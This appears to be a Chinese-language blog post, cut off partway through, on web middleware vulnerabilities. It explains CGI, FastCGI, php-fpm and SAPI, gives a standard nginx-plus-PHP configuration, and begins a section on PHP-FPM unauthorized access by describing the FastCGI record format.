



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">



  <title>
中间件漏洞 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">中间件漏洞
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2023-07-15 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2023-07-15T13:38:45+08:00">2023-07-15</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/38f4d53604cb5ca98a47fea8d62cde72.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/a05ebdd3b7f197e626fa1253c6521ef5.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/1fca97d4bee5434e2dec3c0a4a75bc64.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/f584675dfc4ef47fcf19442f0e2ea18b.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/4c0b0c164bd2511ebcbfec05cd2a7b58.jpg"></li>
          <li class="item" data-background-image="https://img.timelessq.com/images/2022/07/26/fb083e70a3b8e24a3ce23b2c8e2fbc50.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="nginx漏洞"><a class="markdownIt-Anchor" href="#nginx漏洞">#</a> nginx 漏洞</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装fpm</span><br><span class="line">https://blog.csdn.net/weixin_41752294/article/details/90181805</span><br><span class="line">https://juejin.cn/post/7090035549313957902</span><br><span class="line">安装nginx</span><br><span class="line">https://zhuanlan.zhihu.com/p/128579141</span><br><span class="line">安装mysql</span><br><span class="line">https://blog.csdn.net/qq_36582604/article/details/80526287</span><br></pre></td></tr></table></figure>
<h2 id="cgi-fastcgi-php-cgi-php-fpm"><a class="markdownIt-Anchor" href="#cgi-fastcgi-php-cgi-php-fpm">#</a> CGI、FastCGI、php-cgi、php-fpm</h2>
<blockquote>
<p>在 CGI 诞生之前 Web 服务器负责静态文件的存储、查找及响应，此时的服务器还不能处理 php 或 asp 此类文件.</p>
<p>随着人们对于网站的要求越来越高，出现了动态技术.</p>
<p>此时的服务器依然不能直接运行 php 此类文件，虽然自己没办法识别，却可以将识别的过程交给别的程序完成.</p>
<p>对于服务器与这个程序之间，我们需要一些规则来进行约定，这个约定便是 CGI 协议.</p>
<p>CGI 协议是 Web 服务器与 CGI 程序之间传递信息的接口标准., 当 Web 服务器获取到客户端提交的数据后，通过 CGI 接口转交给 CGI 程序处理，最后返回给客户.</p>
<p>在上面可以发现 CGI 协议是一套标准，CGI 程序是在服务端的脚本，它可以是任何代码所实现的.</p>
</blockquote>
<h3 id="cgi"><a class="markdownIt-Anchor" href="#cgi">#</a> CGI</h3>
<p><strong>CGI（Common Gateway Interface）全称是 “通用网关接口”</strong>，WEB 服务器与 PHP 应用进行 “交谈” 的一种工具，其程序须运行在网络服务器上。CGI 可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如 php、perl、tcl 等。</p>
<p>WEB 服务器会传哪些数据给 PHP 解析器呢？<strong>URL、查询字符串、POST 数据、HTTP header</strong> 都会有。所以，CGI 就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
<ol>
<li>当用户请求 Web 服务器的动态脚本</li>
<li>Web 服务器 fork 出一个新的进程启动 CGI 程序 [启动的过程中需要加载配置、扩展等], 将动态脚本交给 CGI 程序处理.</li>
<li>CGI 程序启动后解析动态脚本</li>
<li>将结果返回 Web 服务器</li>
<li>Web 服务器将结果返回客户端，fork 的进程关闭</li>
</ol>
<p>CGI 的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给 apache 和 php。他们通过 cgi 搭线来完成数据传递。这样做的好处了尽量减少 2 个的关联，使他们 2 变得更独立。</p>
<p>可以发现，每次有了动态脚本处理的请求，都需要 fork 新进程，这种工作方式非常低下.</p>
<h3 id="fastcgi"><a class="markdownIt-Anchor" href="#fastcgi">#</a> fastcgi</h3>
<p>FastCGI 是一种协议，是从 CGI 标准的基础上发展而来。它的诞生就是为了减轻 Web 服务器与 CGI 程序的交互负载，使得服务器可以同时处理更多的请求.</p>
<p>FastCGI 进程管理器是遵循 FastCGI 协议的程序，它只是一类程序。FastCGI 像是一个<strong>常驻 (long-live) 型的 CGI</strong>，它可以一直执行着，只要激活后，不会每次都要花费时间去 fork 一次。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行，并且接受来自其它网站服务器来的请求。</p>
<p>FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能。如果 CGI 解释器保持在内存中，并接受 FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over 特性等等。</p>
<p>FastCGI 进程管理器的工作方式</p>
<ol>
<li>客户端请求 Web 服务器的动态脚本</li>
<li>服务器将之交给 FastCGI 主进程</li>
<li>FastCGI 主进程安排空闲进程解析脚本</li>
<li>随后处理结果返回服务器</li>
<li>服务器返回客户</li>
<li>上面的子进程并不会关闭，而是继续等待主进程分配任务.</li>
</ol>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716132311846.png" alt="image-20230716132311846"></p>
<ol>
<li>Web Server 启动时载入 FastCGI 进程管理器（Apache Module 或 IIS ISAPI 等)</li>
<li>FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程 (可建多个 php-cgi)，并等待来自 Web Server 的连接。 当客户端请求到达 Web</li>
<li>Server 时，FastCGI 进程管理器选择并连接到一个 CGI 解释器。Web server 将 CGI 环境变量和标准输入发送到 FastCGI 子进程 php-cgi。</li>
<li>FastCGI 子进程完成处理后，将标准输出和错误信息从同一连接返回 Web Server。当 FastCGI 子进程关闭连接时，请求便告处理完成。FastCGI 子进程接着等待，并处理来自 FastCGI 进程管理器 (运行在 Web Server 中) 的下一个连接。 在 CGI 模式中，php-cgi 在此便退出了。</li>
</ol>
<p>通过上面可以发现，FastCGI 工作效率非常高</p>
<ul>
<li>FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接 (Persistent database connection) 可以工作。</li>
<li>由于 FastCGI 是多进程，所以比 CGI 多线程消耗更多的服务器内存，php-cgi 解释器每进程消耗 7 至 25 兆内存，将这个数字乘以 50 或 100 就是很大的内存数。</li>
</ul>
<h3 id="php-fpm"><a class="markdownIt-Anchor" href="#php-fpm">#</a> php-fpm</h3>
<p>fpm 是 FastCGI 进程管理器的缩写，所以 php-fpm 就是 php 的 FastCGI 进程管理器</p>
<p>PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自 Web 服务器的请求。<strong>目前，PHP5.3 版本之后，PHP-FPM 是内置于 PHP 的</strong>。</p>
<p>在 php5.3 之前 php-fpm 还是个第三方包，5.3 之后官方将它集成到源码中</p>
<p>php-fpm 可以更好的管理 php 进程<br>
控制内存<br>
平滑重载等</p>
<h3 id="php-cgi"><a class="markdownIt-Anchor" href="#php-cgi">#</a> php-cgi</h3>
<p><strong>PHP-CGI</strong> 是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</p>
<ol>
<li>php-cgi 变更 php.ini 配置后，需重启 php-cgi 才能让新的 php-ini 生效，不可以平滑重启。</li>
<li>直接杀死 php-cgi 进程，php 就不能运行了。</li>
</ol>
<p>在 linux 安装好 php 后，会发现在安装目录下有 php 与 php-cgi 文件<br>
 windows 则是 php.exe 与 php-cgi.exe</p>
<p>它们都能运行 php 脚本<br>
不同点在于.php 是命令模式的 php 解释器<br>
而 php-cgi 支持 CGI 协议的 php 解释器，同时也支持 FastCGI 协议</p>
<p>可以说 php-fpm 是 php-cgi 的改进版，php-cgi 以指定的进程工作，而 php-fpm 可以动态的管理子进程，让子进程处理更多的请求.</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-f1c80b648d12429015ebea3b357b1c2a_720w.webp" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。</span><br><span class="line">FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似。</span><br><span class="line">PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</span><br><span class="line">PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716132804504.png" alt="image-20230716132804504"></p>
<h3 id="sapi"><a class="markdownIt-Anchor" href="#sapi">#</a> sapi</h3>
<p>以 Apache 为例，在 PHP Module 方式中，是在 Apache 的配置文件 httpd.conf 中加上这样几句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule php5_module D:/php/php5apache2_2.dll</span><br><span class="line">AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
<p>这种方式，他们的共同本质都是用 LoadModule 来加载 php5_module，就是<strong>把 php 作为 apache 的一个子模块来运行</strong>。当通过 web 访问 php 文件时，apache 就会调用 php5_module 来解析 php 代码。</p>
<p>那么 php5_module 通过 sapi 将数据传给 php 解析器来解析 php 代码</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-0012fbff34586a40ac630f1e2bcf4298_720w.webp" alt="img"></p>
<p>sapi 就是这样的一个中间过程，SAPI 提供了一个和外部通信的接口，有点类似于 socket，使得 PHP 可以和其他应用进行交互数据（apache，nginx 等）。php 默认提供了很多种 SAPI，常见的提供给 apache 和 nginx 的 php5_module、CGI、FastCGI，给 IIS 的 ISAPI，以及 Shell 的 CLI。</p>
<p>所以，以上的 apache 调用 php 执行的过程如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache -&gt; httpd -&gt; php5_module -&gt; sapi -&gt; php</span><br></pre></td></tr></table></figure>
<p>这种模式将 php 模块安装到 apache 中，所以每一次 apache 结束请求，都会产生一条进程，这个进程就完整的包括 php 的各种运算计算等操作。</p>
<p>在上图中，我们很清晰的可以看到，apache 每接收一个请求，都会产生一个进程来连接 php 通过 sapi 来完成请求，可想而知，如果一旦用户过多，并发数过多，服务器就会承受不住了。</p>
<p>而且，把 mod_php 编进 apache 时，出问题时很难定位是 php 的问题还是 apache 的问题。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTExMTgyMC9hcnRpY2xlL2RldGFpbHMvMTA1NTU0NDI2">(94 条消息) 一文读懂 CGI、FastCGI、php-cgi、php-fpm 的区别_phpcgi 和 phpfpm 的区别_小猴子喝牛奶的博客 - CSDN 博客</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85MTAzNzg2NQ==">CGI、FastCGI 和 PHP-FPM 关系解析 - 知乎 (zhihu.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubmdpbngub3JnLmNuL3F1ZXN0aW9uL2RldGFpbC82NDE0">nginx+php，浏览器访问 php 文件时变成下载</span></p>
<h2 id="nginx-php"><a class="markdownIt-Anchor" href="#nginx-php">#</a> nginx + php</h2>
<p>采用 nginx+php 作为 webserver 的架构模式，在现如今运用相当广泛。然而第一步需要实现的是如何让 nginx 正确的调用 php。由于 nginx 调用 php 并不是如同调用一个静态文件那么直接简单，是需要动态执行 php 脚本。所以涉及到了对 nginx.conf 文件的配置。</p>
<h3 id="php-fastcgi配置"><a class="markdownIt-Anchor" href="#php-fastcgi配置">#</a> php fastcgi 配置</h3>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span> default_server;</span><br><span class="line">        <span class="attribute">listen</span>       [::]:<span class="number">80</span> default_server;</span><br><span class="line">        <span class="comment"># 这里改动了，也可以写你的域名</span></span><br><span class="line">        <span class="attribute">server_name</span>  <span class="number">192.168.17.26</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 默认网站根目录（www目录）</span></span><br><span class="line">        <span class="attribute">root</span>         /var/www/;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">        <span class="attribute">include</span> /etc/nginx/default.d/<span class="regexp">*.conf</span>;   <span class="comment">#*/</span></span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="comment"># 这里改动了 定义首页索引文件的名称</span></span><br><span class="line">            <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">            <span class="section">location</span> = /40x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">            <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这里新加的</span></span><br><span class="line">        <span class="comment"># PHP 脚本请求全部转发到 FastCGI处理. 使用FastCGI协议默认配置.</span></span><br><span class="line">        <span class="comment"># Fastcgi服务器和程序(PHP,Python)沟通的协议.</span></span><br><span class="line">        <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="comment"># 设置监听端口</span></span><br><span class="line">            <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">            <span class="comment"># 设置nginx的默认首页文件(上面已经设置过了，可以删除)</span></span><br><span class="line">            <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">            <span class="comment"># 设置脚本文件请求的路径</span></span><br><span class="line">            <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">            <span class="comment"># 引入fastcgi的配置文件</span></span><br><span class="line">            <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在 Nginx 的网站根目录 (/var/www/) 下创建一个 php 文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>证明 nginx 配置成功</p>
<p>目前主流的 nginx+php 的运行原理如下：</p>
<p>1、nginx 的 <code>worker进程</code> 直接管理每一个请求到 nginx 的网络请求。</p>
<p>2、对于 php 而言，由于在整个网络请求的过程中 php 是一个 cgi 程序的角色，所以采用名为 <code>php-fpm的进程管理程序</code> 来对这些被请求的 php 程序进行管理。php-fpm 程序也如同 nginx 一样，需要监听端口，并且有 master 和 worker 进程。worker 进程直接管理每一个 php 进程。</p>
<p>3、关于 fastcgi：fastcgi 是一种进程管理器，管理 cgi 进程。市面上有多种实现了 fastcgi 功能的进程管理器，php-fpm 就是其中的一种。再提一点，php-fpm 作为一种 fast-cgi 进程管理服务，会监听端口， <code>一般默认监听9000端口，并且是监听本机</code> ，也就是只接收来自本机的端口请求，所以我们通常输入命令 netstat -nlpt|grep php-fpm 会得到：<br>
tcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN 1057/php-fpm<br>
 这里的 127.0.0.1:9000 就是监听本机 9000 端口的意思。</p>
<p>4、关于 fastcgi 的配置文件，目前 fastcgi 的配置文件一般放在 nginx.conf 同级目录下，配置文件形式，一般有两种：fastcgi.conf 和 fastcgi_params。不同的 nginx 版本会有不同的配置文件，这两个配置文件有一个非常重要的区别：fastcgi_parames 文件中缺少下列配置：<br>
fastcgi_param SCRIPT_FILENAME fastcgi_script_name;<br>
 我们可以打开 fastcgi_parames 文件加上上述行，也可以在要使用配置的地方动态添加。使得该配置生效。</p>
<p>5、 <code>当需要处理php请求时，nginx的worker进程会将请求移交给php-fpm的worker进程进行处理，也就是最开头所说的nginx调用了php，其实严格得讲是nginx间接调用php</code> 。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;  </span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">8011</span>;  </span><br><span class="line">    <span class="attribute">server_name</span>  test.cn;  </span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php?.*$</span> &#123;  </span><br><span class="line">        <span class="attribute">root</span>           /share/test;  </span><br><span class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;  </span><br><span class="line">        <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;  </span><br><span class="line">        <span class="attribute">include</span>        fastcgi_params;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> <span class="regexp">~ .php?.*$</span>&#123; &#125;：代表一个能匹配对应uri的<span class="section">location</span>，用于匹配一类uri，并对所匹配的uri请求做自定义的逻辑、配置。这里的<span class="section">location</span>，匹配了所有带.php的uri请求，例如：http://192.168.244.128:8011/test.php http://192.168.244.128:8011/index.php等</span><br><span class="line">root /share/test：请求资源根目录，告诉匹配到该<span class="section">location</span>下的uri到/share/test文件夹下去寻找同名资源。</span><br><span class="line">fastcgi_pass <span class="number">127.0.0.1:9000</span>：这行开始是本文的重点：这行代码的意思是，将进入到该<span class="section">location</span>内的uri请求看做是cgi程序，并将请求发送到<span class="number">9000</span>端口，交由php-fpm处理。</span><br><span class="line">fastcgi_param SCRIPT_FILENAME fastcgi_script_name; ：这行配置意思是：动态添加了一行fastcgi配置，配置内容为SCRIPT_FILENAME，告知管理进程，cgi脚本名称。由于我的nginx中只有fastcgi_params文件，没有fastcgi.conf文件，所以要使php-fpm知道SCRIPT_FILENAME的具体值，就必须要动态的添加这行配置。</span><br><span class="line"><span class="attribute">include</span> fastcgi_params; 引入fastcgi配置文件</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85NzIwODI1Mg==">Nginx 和 PHP 的配置 - 知乎 (zhihu.com)</span></p>
<p>[CentOS 7 安装 php-5.6.20_51CTO 博客_centos7 安装 php](<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS90cnlydXMvMTc2ODUyNSM6fjp0ZXh0PSVFNCVCOCU4MCVFMyU4MCU4MSVFNSVBRSU4OSVFOCVBMyU4NSVFNyU4RSVBRiVFNSVBMiU4MyVFRiVCQyU5QUNlbnRPUw==">https://blog.51cto.com/tryrus/1768525#:~:text = 一、安装环境：CentOS</span> 7 Linux version 3.10.0-229.el7.x86_64 php-5.6.20 二、安装步骤： 2.1,libjpeg-devel libpng-devel libxml2-devel bzip2-devel libcurl-devel –y 2.2 下载 php-5.6.20)</p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODUxNzMzNzY=">PHP-FPM 和 Nginx 进行安装配置详解 - 知乎 (zhihu.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Fsb2hhMTIvYXJ0aWNsZS9kZXRhaWxzLzg4ODUyNzE0">(94 条消息) php 环境搭建（正确配置 nginx 和 php）_nginx php_aloha12 的博客 - CSDN 博客</span></p>
<h2 id="php-fpm未授权访问漏洞"><a class="markdownIt-Anchor" href="#php-fpm未授权访问漏洞">#</a> PHP-FPM 未授权访问漏洞</h2>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230716191609643.png" alt="image-20230716191609643"></p>
<h3 id="fastcgi-record"><a class="markdownIt-Anchor" href="#fastcgi-record">#</a> Fastcgi Record</h3>
<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>
<p>HTTP 协议是浏览器和服务器中间件进行数据交换的协议，浏览器将 HTTP 头和 HTTP 体用某个规则组装成数据包，以 TCP 的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以 HTTP 协议的规则打包返回给服务器。</p>
<p>类比 HTTP 协议来说，fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>和 HTTP 头不同，record 的头固定 8 个字节，body 是由头中的 contentLength 指定，其结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char type; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
<p>头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 body 的大小。</p>
<p>语言端解析了 fastcgi 头以后，拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。</p>
<p>Body 后面还有一段额外的数据（Padding），其长度由头中的 paddingLength 指定，起保留作用。不需要该 Padding 的时候，将其长度设置为 0 即可。</p>
<p>可见，一个 fastcgi record 结构最大支持的 body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>
<h3 id="fastcgi-type"><a class="markdownIt-Anchor" href="#fastcgi-type">#</a> Fastcgi Type</h3>
<p><code>type</code>  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 <code>type</code>  来标志每个 record 的作用，用 <code>requestId</code>  作为同一次请求的 id。</p>
<p>也就是说，每次请求，会有多个 record，他们的 <code>requestId</code>  是相同的。</p>
<p>借用<span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2hyZWNrNjYvYXJ0aWNsZS9kZXRhaWxzLzUwMzU1NzI5">该文章</span>中的一个表格，列出最主要的几种 <code>type</code> ：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p>
<p>服务器中间件和后端语言通信，第一个数据包就是 <code>type</code>  为 1 的 record，后续互相交流，发送 <code>type</code>  为 4、5、6、7 的 record，结束时发送 <code>type</code>  为 2、3 的 record。</p>
<p>当后端语言接收到一个 <code>type</code>  为 4 的 record 后，就会把这个 record 的 body 按照对应的结构解析成 key-value 对，这就是环境变量</p>
<p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p>
<ol>
<li>key、value 均小于 128 字节，用 <code>FCGI_NameValuePair11</code></li>
<li>key 大于 128 字节，value 小于 128 字节，用 <code>FCGI_NameValuePair41</code></li>
